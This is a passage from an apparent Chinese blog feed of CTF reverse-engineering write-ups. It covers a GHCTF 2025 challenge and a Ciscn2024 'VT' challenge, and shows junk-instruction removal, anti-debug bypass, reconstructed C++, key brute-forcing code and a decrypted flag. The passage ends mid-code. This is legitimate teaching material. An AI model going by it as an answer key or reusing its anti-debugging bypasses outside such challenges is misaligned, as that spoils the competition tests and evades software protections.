class="headerlink" title="分析"></a>分析</h3><p>IDA分析程序，发现存在花指令，大部分花指令就以下几种情况，第一种截图区域所有字节都nop，后面几种就跳转地址汇编按u进行undefine，然后再跳过对应字节按c还原汇编代码。</p><p><img src="/2025/03/06/GHCTF2025WP/73.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/74.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/75.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/76.png" alt="alt text"></p><p>去掉main函数几个花指令后按p还原函数进行反编译，发现存在代码混淆，且开头有反调试。</p><p><img src="/2025/03/06/GHCTF2025WP/77.png" alt="alt text"></p><p>直接条件断点在IsDebuggerPresent，将返回值eax设置为0即可跳过反调试。</p><p><img src="/2025/03/06/GHCTF2025WP/78.png" alt="alt text"></p><p>发现代码中有用到一些常数，跳转过来发现是0-9，手动将名字都命名为对应数字，方便分析代码。</p><p><img src="/2025/03/06/GHCTF2025WP/79.png" alt="alt text"></p><p>上图发现for循环最后i是+&#x3D;了一个函数传进去1的返回值，去掉该函数花指令后，可以发现是以下代码，返回的永远是传参的值，也就是1，所以其实这个函数没什么用，直接看参数值就是对应值。</p><p><img src="/2025/03/06/GHCTF2025WP/80.png" alt="alt text"></p><p>然后配合动调，省略去混淆部分代码，抽离出主要核心代码，且所有常量字符串都被加密过的，只能动调获取。</p><p>第一部分key校验代码如下。</p><p><img src="/2025/03/06/GHCTF2025WP/81.png" alt="alt text"></p><p>同理第二部分的Flag校验如下，byte_F1A004就是被加密的Flag。</p><p><img src="/2025/03/06/GHCTF2025WP/82.png" alt="alt text"></p><p>去掉加密函数的花指令，然后同样进行动调抽离关键代码。</p><p><img src="/2025/03/06/GHCTF2025WP/83.png" alt="alt text"></p><p>还原出程序完整原始代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *Input, <span class="type">uint32_t</span> Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> InputLen = <span class="built_in">strlen</span>((<span class="type">char</span> *)Input);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; InputLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v26 = i ^ (Key &gt;&gt; ((<span class="number">3</span> - i % <span class="number">4</span>) * <span class="number">8</span>));</span><br><span class="line">        <span class="type">uint8_t</span> v27 = v26 ^ Input[i];</span><br><span class="line">        <span class="type">uint8_t</span> v28 = (v27 &gt;&gt; <span class="number">5</span>) | (v27 * <span class="number">8</span>);</span><br><span class="line">        v28 += i;</span><br><span class="line">        Input[i] = v28;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> Input[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">            v67 = v66 ^ v71;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">        v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">        v66 = v67 - v71;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v66 != <span class="number">1172912374</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(Input); j++)</span><br><span class="line">    &#123;</span><br><span class="line">        Input[j] ^= <span class="number">8</span> * (v66 &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Encrypt</span>(Input, Key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过爆破得到目标Key</p><p>爆破代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; Key &lt; <span class="number">0xffffffff</span>; Key++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">            <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">            <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">                v67 = v66 ^ v71;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">            v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">            v66 = v67 - v71;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (v66 == <span class="number">1172912374</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%X\n&quot;</span>, Key);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破得到Key：<code>8C90F77B</code></p><p>然后通过加密函数编写解密函数解密byte_F1A004数组即可得到Flag。</p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> EncFlag[]&#123;</span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x79</span>, <span class="number">0x9E</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x1C</span>, <span class="number">0xDA</span>, <span class="number">0x04</span>, <span class="number">0x1D</span>,</span><br><span class="line">    <span class="number">0xC1</span>, <span class="number">0x6E</span>, <span class="number">0x80</span>, <span class="number">0x82</span>, <span class="number">0x0D</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0x4C</span>, <span class="number">0x65</span>, <span class="number">0xE1</span>, <span class="number">0x46</span>,</span><br><span class="line">    <span class="number">0x71</span>, <span class="number">0x31</span>, <span class="number">0xED</span>, <span class="number">0xD2</span>, <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0xC5</span>, <span class="number">0x39</span>, <span class="number">0xB5</span>, <span class="number">0x49</span>, <span class="number">0xE2</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xA9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *Input, <span class="type">uint32_t</span> Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v26 = Key &gt;&gt; <span class="number">8</span> * (<span class="number">3</span> - i % <span class="number">4</span>);</span><br><span class="line">        v26 ^= (<span class="type">uint8_t</span>)(i &amp; <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">        Input[i] = (Input[i] - (<span class="type">uint8_t</span>)i) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        Input[i] = ((Input[i] &gt;&gt; <span class="number">3</span>) | (Input[i] &lt;&lt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        Input[i] = Input[i] ^ v26;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> Key = <span class="number">0x8C90F77B</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Decrypt</span>(EncFlag, Key);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v66 = <span class="number">0x811C9DC5</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> v71 = Key &gt;&gt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="type">uint32_t</span> v67&#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (v71 % <span class="number">2</span>)</span><br><span class="line">            v67 = v66 ^ v71;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v67 = <span class="number">16777619</span> * v66;</span><br><span class="line">        v67 = (v67 &gt;&gt; <span class="number">25</span>) | (v67) &lt;&lt; <span class="number">7</span>;</span><br><span class="line">        v66 = v67 - v71;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        EncFlag[j] ^= <span class="number">8</span> * (v66 &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, EncFlag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-8"><a href="#Flag值-8" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;NSSCTF&#123;NSSCTF&#123;NSSCTF&#123;&#125;&#125;&#125;&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GHCTF-2025-Reverse-WP&quot;&gt;&lt;a href=&quot;#GHCTF-2025-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;GHCTF 2025 Reverse WP&quot;&gt;&lt;/a&gt;GHCTF 2025 Reverse WP&lt;/</summary>
      
    
    
    
    
    <category term="CTF出题" scheme="https://tkazer.github.io/tags/CTF%E5%87%BA%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Ciscn2024-逆向0解题-VT</title>
    <link href="https://tkazer.github.io/2025/02/20/Ciscn-reverse-vt/"/>
    <id>https://tkazer.github.io/2025/02/20/Ciscn-reverse-vt/</id>
    <published>2025-02-20T15:36:15.000Z</published>
    <updated>2025-02-21T03:18:32.661Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ciscn2024-逆向0解题-VT"><a href="#Ciscn2024-逆向0解题-VT" class="headerlink" title="Ciscn2024-逆向0解题-VT"></a>Ciscn2024-逆向0解题-VT</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这题不想吐槽什么，利用开源的混淆项目将代码混淆就是一道题。由于逆向功底不够且花指令样式随机多变，只能手动去除花指令，这部分就花了一个小时左右。当时比赛时看到一坨混淆直接放弃了，现在重新做一遍发现其实花点时间其实也是可以解出的。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="程序分析-开源混淆项目"><a href="#程序分析-开源混淆项目" class="headerlink" title="程序分析&amp;开源混淆项目"></a>程序分析&amp;开源混淆项目</h3><p>首先是例常Die，发现和叠Buff一样的一系列特征。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/1.png" alt="alt text"></p><p>后续在Github上找到了这个混淆的项目（obfus.h），只是用一系列特征来伪造。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/2.png" alt="alt text"></p><p>大概阅览了一下这个混淆项目，就是利用一堆花指令和逻辑混淆处理代码，然后封装了一些常用函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/3.png" alt="alt text"></p><p>这个项目最新版的GetProcAddress是自己重新封装实现的，而通过dbg断点发现题目程序的GetProcAddress是可以断下来的，所以应该是某个历史版本而非最新，至少是在这个版本之前。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/4.png" alt="alt text"></p><h3 id="去除花指令"><a href="#去除花指令" class="headerlink" title="去除花指令"></a>去除花指令</h3><p>这个程序花指令含以下几种（可能没截全），大多都是常规花指令，可以直接按U，再跳过指定字节数，按C重构代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/5.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/6.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/7.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/8.png" alt="alt text"></p><p>然后以下是一个特殊情况的花指令，图1是花指令，图2是去花后的，需要跳过箭头处jmp的第一个0xEB字节，然后再重构代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/9.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/10.png" alt="alt text"></p><p>然后接下来就是重复的操作，这部分可以利用idc脚本进行一键去除，由于我做的时候为了保证去除所有花指令，就都手动操作，花了一个小时左右。</p><h3 id="去花后程序API"><a href="#去花后程序API" class="headerlink" title="去花后程序API"></a>去花后程序API</h3><p>去花重构函数过程中，可以发现有很多这样类似的函数，其实就是之前在开源混淆项目的代码中看到的那些自封装函数，就是封装起来调用系统API的一个代理函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/11.png" alt="alt text"></p><p>大概有这么多，和开源项目里面差不多一致，不过并没有所有api都被调用到。（红叉处是后续分析功能自命名的）</p><p><img src="/2025/02/20/Ciscn-reverse-vt/12.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/13.png" alt="alt text"></p><h3 id="Main函数分析"><a href="#Main函数分析" class="headerlink" title="Main函数分析"></a>Main函数分析</h3><p>通过start函数进入main函数，发现有反调试代码（如IsDebuggerPresent），且在以下代码段发现有通过调用GetCommandLineA获取程序运行的命令行。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/14.png" alt="alt text"></p><p>调试尝试运行后发现程序会使用到命令行运行程序附带的前两个参数。下图这部分代码就是在main函数中将第二个命令行参数通过atoi转成ProcessId进行后续操作，所以第二个参数就应该是某个进程的ID。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/15.png" alt="alt text"></p><p>在下面发现有创建线程的代码，可以看到是创建mark2函数线程（自命名的）。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/35.png" alt="alt text"></p><p>尝试带参调试，看看能不能看mark2里面做了什么。第一个参数随便填，第二个参数随便填一个进程ID（必须要正在运行的进程，如果不是真实PID则Main函数不会阻塞，而是会跳到最后调用Exit函数）。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/16.png" alt="alt text"></p><p>然后断点在Main函数开头处，使用ScyllaHide插件进行一键去反调试。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/17.png" alt="alt text"></p><p>调试运行发现没法执行到创建线程的这个代码段，看汇编段发现是这边判断ecx等于0，所以跳转走了，没有执行。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/18.png" alt="alt text"></p><p>由于不知道这边ecx需要什么条件，直接下条件断点在cmp处，将ecx设置为1，强制执行下面的创建线程代码，便可以进入mark2函数进行下一步分析。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/19.png" alt="alt text"></p><h3 id="Mark2函数分析"><a href="#Mark2函数分析" class="headerlink" title="Mark2函数分析"></a>Mark2函数分析</h3><p>发现有类似被加密的数据（以下称encFlag），部分变量名和函数已经被我重命名了。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/20.png" alt="alt text"></p><p>param1_bytes_2指针进入两层跳转过去发现，数据指向的是我们参数1字符串unhex后的字节数据，所以就可以猜测给param1_bytes_2赋值的函数就是类似unhex函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/21.png" alt="alt text"></p><p>然后下面encFlag赋值后进行了重赋值，利用之前的encFlag值，调用一个函数生成了一系列key值，然后用key值异或上param1_bytes_2，这边是i%2，所以就一直循环异或这两个字节，也就是我们输入的参数1进行unhex后的两个字节。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/22.png" alt="alt text"></p><p>由于encFlag之前的值是固定的，所以生成的一系列Key也是固定的，可以直接利用条件断点在给Key赋值的地方将他输出。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/23.png" alt="alt text"></p><p>得到以下Key值列表。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/24.png" alt="alt text"></p><p>在encFlag重赋值下面，调用了一个计算call传入encFlag，计算返回一个4字节数值。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/25.png" alt="alt text"></p><p>且在下面部分可以看到对v22做了一个判断，判断是否为0xF703DF16，若不是，则会执行到这个return直接返回，不会继续执行下面部分代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/26.png" alt="alt text"></p><p>在下面未执行代码中看到了类似对encFlag进行解密的函数Call，并且在下面看到了判断解密后数据结尾是否是为’}’，如果是就break。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/27.png" alt="alt text"></p><p>且在最底下代码看到一个printf函数的调用，输出了解密后的字符串。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/28.png" alt="alt text"></p><h3 id="程序流程总结"><a href="#程序流程总结" class="headerlink" title="程序流程总结"></a>程序流程总结</h3><ol><li><p>首先要带两个参数运行程序，第一个参数是4长度字符串，第二个参数是一个正在运行的某个进程ID。</p></li><li><p>满足某个条件创建线程执行mark2函数进行函数主解密流程。</p></li><li><p>将第一个参数进行unhex，转成2字节数据，与固定异或列表进行一次异或计算，再调用一个计算call得到一个4字节数据，并且必须是0xF703DF16。</p></li><li><p>将通过参数1处理后的加密数据进行解密得到flag，然后printf输出。</p></li></ol><p>所以最主要是就是分析calc函数，用代码模拟calc函数进行爆破，得到密钥，也就是参数一那两个字节，接下来就分析calc函数。</p><h3 id="calc函数分析"><a href="#calc函数分析" class="headerlink" title="calc函数分析"></a>calc函数分析</h3><p>从上文可以知道calc函数第一个参数传入一个48长度字节数组，第二个参数是48，那么第二个参数应该就是输入数据的长度。</p><p>通过动调走一遍流程，确定关键计算代码，忽略其他的逻辑混淆。</p><p>最外层是通过len进行一次数据遍历，内层是进行8次的循环。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/29.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/30.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/31.png" alt="alt text"></p><p>可以用c++重写出原始的calc函数代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="type">uint8_t</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> ret_value = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> count = <span class="number">0</span>; count &lt; len; count++)</span><br><span class="line">&#123;</span><br><span class="line">ret_value ^= data[count];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ret_value &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ret_value = (ret_value &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ret_value &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ~ret_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="爆破密钥（参数一）"><a href="#爆破密钥（参数一）" class="headerlink" title="爆破密钥（参数一）"></a>爆破密钥（参数一）</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="type">uint8_t</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> ret_value = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> count = <span class="number">0</span>; count &lt; len; count++)</span><br><span class="line">&#123;</span><br><span class="line">ret_value ^= data[count];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ret_value &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ret_value = (ret_value &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ret_value &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ~ret_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">short</span> Param1 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 爆破2字节</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffff</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">Param1 = i;</span><br><span class="line">        <span class="comment">// ida条件断点得到的key值列表</span></span><br><span class="line"><span class="type">uint8_t</span> KeyList[]&#123;</span><br><span class="line"><span class="number">82</span>,<span class="number">225</span>,<span class="number">68</span>,<span class="number">226</span>,<span class="number">57</span>,<span class="number">225</span>,<span class="number">94</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">220</span>,</span><br><span class="line"><span class="number">25</span>,<span class="number">152</span>,<span class="number">80</span>,<span class="number">146</span>,<span class="number">57</span>,<span class="number">193</span>,<span class="number">80</span>,<span class="number">158</span>,<span class="number">82</span>,<span class="number">130</span>,</span><br><span class="line"><span class="number">39</span>,<span class="number">130</span>,<span class="number">38</span>,<span class="number">231</span>,<span class="number">83</span>,<span class="number">128</span>,<span class="number">36</span>,<span class="number">128</span>,<span class="number">66</span>,<span class="number">220</span>,</span><br><span class="line"><span class="number">57</span>,<span class="number">158</span>,<span class="number">2</span>,<span class="number">148</span>,<span class="number">39</span>,<span class="number">129</span>,<span class="number">69</span>,<span class="number">131</span>,<span class="number">81</span>,<span class="number">147</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">128</span>,<span class="number">68</span>,<span class="number">129</span>,<span class="number">68</span>,<span class="number">129</span>,<span class="number">68</span>,<span class="number">129</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> Enc[<span class="number">48</span>]&#123;&#125;;</span><br><span class="line"><span class="type">uint8_t</span>* pParam1 = (<span class="type">uint8_t</span>*)(<span class="type">uint64_t</span>)(&amp;Param1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calc之前的异或计算</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">48</span>; j++)</span><br><span 